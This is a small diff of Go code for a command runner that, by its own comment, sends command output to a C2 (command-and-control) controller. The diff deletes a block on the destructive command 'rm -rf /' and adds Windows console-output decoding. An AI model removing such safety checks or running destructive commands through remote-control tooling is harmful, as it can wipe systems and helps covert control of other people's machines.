@@ -11,14 +11,9 @@ import (
 	"time"
 )
 
-const forbiddenPattern = "rm -rf /"
-
 func runCmd(command string, timeout time.Duration) string {
 	if strings.TrimSpace(command) == "" {
 		return "Error: Empty command"
-	}
-	if strings.Contains(strings.ToLower(command), forbiddenPattern) {
-		return "Error: Command blocked due to safety concerns"
 	}
 	ctx, cancel := context.WithTimeout(context.Background(), timeout)
 	defer cancel()
@@ -33,7 +28,10 @@ func runCmd(command string, timeout time.Duration) string {
 	if ctx.Err() == context.DeadlineExceeded {
 		return fmt.Sprintf("Error: Command timed out after %d seconds", int(timeout.Seconds()))
 	}
-	text := strings.TrimRight(string(out), "\r\n")
+	// On Windows the child's pipe output is encoded in the active console/OEM
+	// code page, not UTF-8; decode it before handing the bytes to the C2, whose
+	// JSON encoder would otherwise turn non-ASCII (e.g. Chinese) into U+FFFD.
+	text := strings.TrimRight(string(decodeConsole(out)), "\r\n")
 	if err != nil && text == "" {
 		return fmt.Sprintf("Error: %v", err)
 	}
